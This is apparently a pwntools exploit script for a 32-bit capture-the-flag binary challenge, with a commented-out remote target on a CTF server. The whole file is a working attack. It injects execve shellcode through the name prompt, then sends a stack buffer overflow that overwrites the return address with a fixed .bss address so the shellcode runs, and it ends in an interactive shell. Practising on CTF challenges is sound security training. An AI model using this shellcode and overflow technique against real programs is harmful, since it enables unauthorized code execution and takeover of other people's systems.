from pwn import *
from LibcSearcher import *
context.terminal=['tmux','splitw','-h']
context(os='linux', arch='i386', kernel='i386',log_level='debug')
#io=gdb.debug('./pwn')
io=process('./pwn')
#io=remote('node4.buuoj.cn',29097)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive

gdb.attach(io,'''
            b main
            b vul_function
''')
pause()

shell=shellcode=asm(shellcraft.sh())


payload1=shell
ru(b'What is your name?')
sl(payload1)

ru(b'What do you want to say?')


bass=0x804A300
payload2=b'a'*(0x18+4)+p32(bass)

sl(payload2)

ii()
